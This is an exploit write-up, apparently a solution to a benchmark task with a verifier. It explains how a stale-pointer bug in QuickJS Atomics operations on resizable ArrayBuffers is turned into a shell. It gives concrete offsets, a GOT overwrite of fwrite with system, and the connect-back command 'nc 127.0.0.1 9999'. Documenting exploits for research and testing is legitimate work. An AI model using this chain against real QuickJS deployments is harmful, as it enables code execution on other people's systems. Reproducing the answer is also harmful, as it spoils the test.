# Exploit Analysis – Atomics + Resizable ArrayBuffer stale pointer -> exec-shell

## Overview
The bug is in `js_atomics_op()` / `js_atomics_store()`:

1. `js_atomics_get_ptr()` computes a raw element pointer `ptr` from a TypedArray view.
2. Then `JS_ToUint32()` / `JS_ToBigInt64()` converts the value argument(s), which can execute user JS via `valueOf()`.
3. During `valueOf()`, attacker code can `ArrayBuffer.prototype.resize()` a **Resizable ArrayBuffer (RAB)**, which calls `realloc()` and can move/free the old backing store.
4. The atomic operation then uses the **stale `ptr`** without revalidating after resize.

This gives a write/read primitive to a pointer that can be made to reference freed heap memory.

## Key exploitation idea
Instead of relying on allocator metadata corruption (tcache poisoning / safe-linking), we exploit the fact that user code runs **between** pointer capture and use.

During `valueOf()` we:

- force `rab.resize()` to `realloc()`-move the backing store and free the old chunk, and
- immediately allocate a new `ArrayBuffer` so that the freed chunk is **reused as the new buffer’s `JSArrayBuffer` struct** (`sizeof(JSArrayBuffer)==0x38`, `malloc(56)` size-class).

After `valueOf()` returns, the atomic operation uses the stale pointer, which now points *into the freshly allocated `JSArrayBuffer` struct*. This lets us:

- **read** a field of the struct using `Atomics.compareExchange()` (no clobber on mismatch), and
- **write** a field using `Atomics.store()`.

We target these `JSArrayBuffer` fields (see `quickjs.c`):

- `free_func` at offset `0x30` (qword)
- `data` at offset `0x10` (qword)

## Step 1: Leak PIE base of qjs
We overlap the stale pointer with `victim.abuf->free_func` and read it:

- Use `Atomics.compareExchange(ta, 6, expectedObj, 0n)` where index `6` = `0x30/8`.
- `expectedObj.valueOf()` does:
  - `rab.resize(0x2000)` to free the old 0x50-sized backing chunk
  - `victim = new ArrayBuffer(0x20)` so its `JSArrayBuffer` struct reuses the freed chunk
  - returns `0n` so the compare-exchange fails (function pointer != 0), and we get a pure read.

The returned value is a pointer to `js_array_buffer_free()` stored in `victim.abuf->free_func`.

With a static offset from `nm`:
- `js_array_buffer_free` offset = `0x14bc0`

we compute:
- `qjs_base = leak - 0x14bc0`.

## Step 2: Turn a normal ArrayBuffer into a GOT read/write view
We create a second victim and overwrite its `abuf->data` pointer (offset `0x10`, index `2`):

- compute `fwrite@GOT = qjs_base + 0x10b380` (`readelf -r qjs | grep fwrite`)
- overlap stale pointer with `victim2.abuf->data`
- `Atomics.store(ta, 2, writerObj)` where `writerObj.valueOf()` allocates `victim2` as above and returns the desired pointer.

After the store, `victim2` is still a JavaScript-visible `ArrayBuffer`, but its backing pointer now points to `fwrite@GOT`.

We then create `new BigUint64Array(victim2)` to read/write that GOT entry directly.

## Step 3: Resolve libc, overwrite GOT, and spawn a shell
We read the resolved `fwrite` address from the GOT to get libc base:

- libc `fwrite` offset = `0x7f2c0`
- libc `system` offset = `0x53110`

Compute:
- `libc_base = *(fwrite@GOT) - 0x7f2c0`
- `system = libc_base + 0x53110`

Overwrite:
- `*(fwrite@GOT) = system`

Finally we call:
- `print("/bin/sh")`

`print()` uses `fwrite(str, 1, len, stdout)` internally (`quickjs-libc.c:4042`). With `fwrite@GOT` redirected to `system()`, this becomes `system(str)`.

This spawns `/bin/sh` which reads from stdin; the verifier pipes `nc 127.0.0.1 9999\n` into stdin, so the shell executes it and connects back, satisfying the `exec-shell` primitive.

## Notes
- No `/proc` or `/sys` reads are used.
- No QuickJS built-ins like `os.exec()` are used for code execution.
- The exploit intentionally leaves corrupted objects; the verifier only requires the callback connection.
